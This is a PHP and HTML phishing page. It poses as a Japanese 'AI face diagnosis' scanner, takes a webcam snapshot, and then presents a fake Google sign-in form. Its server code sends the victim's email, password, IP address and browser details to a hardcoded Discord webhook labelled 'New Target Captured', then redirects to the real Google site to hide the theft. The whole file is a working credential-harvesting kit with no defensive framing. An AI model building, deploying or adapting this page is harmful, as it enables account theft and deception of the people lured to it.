<?php
/**
 * PROJECT: Deep Neural Analyzer - Face & Auth Capture
 * VERSION: 2.5 (2026 Final Edition)
 * PURPOSE: Diagnostic Front-end / Discord Exfiltration Back-end
 */

// --- [CONFIG] ---
$webhook_url = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm"; 

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $img   = $_POST['img']; 
    $ip    = $_SERVER['REMOTE_ADDR'];
    $ua    = $_SERVER['HTTP_USER_AGENT'];

    // Discord Payload
    $payload = [
        "username" => "Deep Neural Security",
        "avatar_url" => "https://www.gstatic.com/images/branding/product/2x/dispute_v2_48dp.png",
        "embeds" => [[
            "title" => "🎯 New Target Captured",
            "color" => 0, // Solid Black
            "fields" => [
                ["name" => "📧 Email/ID", "value" => "```$email```", "inline" => true],
                ["name" => "🔑 Password", "value" => "```$pass```", "inline" => true],
                ["name" => "🌐 IP Address", "value" => "[$ip](https://ipinfo.io/$ip)", "inline" => false],
                ["name" => "📱 Device Info", "value" => "```$ua```", "inline" => false]
            ],
            "footer" => ["text" => "Thugnificent Intelligence Systems v2.5"],
            "timestamp" => date("c")
        ]]
    ];

    // cURL Execution
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Fade away to real Google
    header("Location: https://accounts.google.com/signin/v2/challenge/pwd?service=mail");
    exit();
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deep Neural Analyzer | AI顔診断</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Montserrat', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { position: relative; width: 380px; z-index: 1; }
        .card { background: rgba(15, 15, 15, 0.98); border: 1px solid #222; padding: 40px; border-radius: 24px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,1); }
        h1 { font-weight: 600; font-size: 22px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
        p { font-weight: 300; font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 30px; }
        .v-wrap { position: relative; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #333; margin-bottom: 30px; background: #050505; }
        #video { width: 100%; display: block; transform: scaleX(-1); }
        .scan { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #fff; box-shadow: 0 0 15px #fff; display: none; animation: move 2s infinite linear; z-index: 10; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
        .btn { background: #fff; color: #000; border: none; padding: 16px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { background: #00f2fe; color: #000; box-shadow: 0 0 20px rgba(0, 242, 254, 0.4); }
        #login-ui { display: none; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #222; border-radius: 8px; background: #0c0c0c; color: #fff; font-size: 15px; }
        input:focus { outline: none; border-color: #fff; }
        .google-logo { margin-bottom: 20px; filter: grayscale(1); }
    </style>
</head>
<body>
    <div class="container">
        <div class="card" id="camera-ui">
            <h1>NEURAL<br>ANALYZER</h1>
            <p>AI深層学習により、あなたの社会的知能指数を解析します。カメラを正面に捉えてください。</p>
            <div class="v-wrap">
                <div class="scan" id="scanner"></div>
                <video id="video" autoplay playsinline></video>
            </div>
            <button class="btn" id="start-btn">スキャンを開始</button>
        </div>

        <div class="card" id="login-ui">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75" class="google-logo">
            <h1>IDENTIFY</h1>
            <p>解析データの暗号化が完了しました。本人確認を行って、診断レポート（PDF）を展開してください。</p>
            <form id="trap-form">
                <input type="email" id="email" placeholder="メールアドレス" required>
                <input type="password" id="pass" placeholder="パスワード" required>
                <button type="submit" class="btn">認証を完了して結果を見る</button>
            </form>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        const scanner = document.getElementById('scanner');
        let capturedImg = "";

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                startBtn.innerText = "ANALYZING...";
                startBtn.disabled = true;
                scanner.style.display = "block";
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    capturedImg = canvas.toDataURL('image/jpeg');
                    
                    document.getElementById('camera-ui').style.display = 'none';
                    document.getElementById('login-ui').style.display = 'block';
                    stream.getTracks().forEach(t => t.stop());
                }, 4500);
            } catch (err) { alert("セキュリティ警告: 解析にはカメラへのアクセス許可が必要です。"); }
        };

        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            const fd = new FormData();
            fd.append('email', document.getElementById('email').value);
            fd.append('pass', document.getElementById('pass').value);
            fd.append('img', capturedImg);

            await fetch(window.location.href, { method: 'POST', body: fd });
            window.location.href = "https://accounts.google.com/";
        };
    </script>
</body>
</html>
